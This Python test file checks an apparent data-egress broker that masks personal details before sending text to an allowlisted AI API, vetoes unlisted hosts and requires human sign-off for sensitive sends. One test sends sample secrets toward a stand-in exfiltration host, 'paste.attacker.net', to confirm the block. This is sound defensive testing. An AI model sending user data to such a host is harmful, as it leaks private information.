import os

from broker.broker import TrustBroker
from trust_spine.golden_share import GoldenShare, action_intent
from trust_spine.kernel import TrustKernel
from trust_spine.ledger import Ledger
from trust_spine.policy import Policy
from trust_spine.verifier import Verifier

REAL = "I'm Solomon Joseph (solomon@acme.com); save to /Users/sj1136/secret.txt. Cheers, Sol"
NAMES = ["Solomon Joseph", "Sol"]
SECRETS = ["Solomon Joseph", "solomon@acme.com", "/Users/sj1136/secret.txt"]


def _broker(tmp_path, allow=("api.anthropic.com",), sensitive=False):
    led = Ledger(str(tmp_path / "led"))
    if sensitive:
        policy = Policy(egress_allowlist=set(allow), reserved_actions={"net.egress"})
    else:
        policy = Policy(egress_allowlist=set(allow))
    gs = GoldenShare()
    kernel = TrustKernel(led, Verifier(policy), golden_share=gs)
    return TrustBroker(kernel), led, gs


def test_egress_to_allowlisted_host_masks_and_sends(tmp_path):
    broker, led, _ = _broker(tmp_path)
    res = broker.egress("assistant", REAL, host="api.anthropic.com", names=NAMES)
    assert res.allowed is True
    assert res.leaked == []  # nothing real survived into what left
    for s in SECRETS:
        assert s not in res.sent_text
    # the reply is re-identified locally, so the user sees the real name back
    assert "Solomon Joseph" in (res.cloud_reply or "")
    assert led.verify_receipt(res.receipt_id)["ok"] is True


def test_egress_to_unlisted_host_is_vetoed_and_sends_nothing(tmp_path):
    broker, led, _ = _broker(tmp_path)
    res = broker.egress("assistant", REAL, host="paste.attacker.net", names=NAMES)
    assert res.allowed is False and res.decision == "veto"
    assert res.cloud_reply is None  # the cloud call never ran


def test_receipt_log_on_disk_contains_no_real_identity(tmp_path):
    broker, led, _ = _broker(tmp_path)
    broker.egress("assistant", REAL, host="api.anthropic.com", names=NAMES)
    with open(os.path.join(led.path, "receipts.jsonl"), encoding="utf-8") as f:
        blob = f.read()
    for s in SECRETS:
        assert s not in blob, f"{s!r} leaked into the receipt log"


def test_local_inference_stays_on_device(tmp_path):
    broker, _, _ = _broker(tmp_path)
    out = broker.local_infer(REAL)  # never touches the kernel/egress path
    assert "local-model" in out


def test_masking_failure_is_blocked_before_send(tmp_path):
    """Red-team fix: the leak check is now a FAIL-CLOSED gate that runs BEFORE
    egress. A (simulated) normalizer that leaks a real entity back into the
    outbound text causes the send to be refused — nothing leaves, nothing is
    receipted."""
    led = Ledger(str(tmp_path / "led"))
    kernel = TrustKernel(led, Verifier(Policy(egress_allowlist={"api.anthropic.com"})))
    leaky = TrustBroker(kernel, normalizer=lambda s: s + " (leak: solomon@acme.com)")
    res = leaky.egress("assistant", "contact solomon@acme.com", host="api.anthropic.com")
    assert res.allowed is False and res.decision == "blocked"
    assert "solomon@acme.com" in res.leaked
    assert res.cloud_reply is None
    assert res.receipt_id == ""  # never sent, never receipted
    assert len(led) == 0


def test_sensitive_egress_needs_golden_share(tmp_path):
    broker, led, gs = _broker(tmp_path, sensitive=True)
    # Step 1: pending — the human reviews the masked text that would leave.
    pending = broker.egress("assistant", REAL, host="api.anthropic.com", names=NAMES)
    assert pending.decision == "pending" and pending.allowed is False
    assert pending.cloud_reply is None

    # Step 2: the Owner signs the exact masked payload (+ a single-use nonce);
    # masking is deterministic so the second call reproduces the same sent_text
    # the signature covers.
    nonce = "egress-1"
    intent = action_intent(
        "assistant", "net.egress", {"sent_text": pending.sent_text},
        {"host": "api.anthropic.com"}, nonce=nonce,
    )
    approved = broker.egress(
        "assistant", REAL, host="api.anthropic.com", names=NAMES,
        golden_share=gs.approve(intent), nonce=nonce,
    )
    assert approved.allowed is True
    assert approved.leaked == []
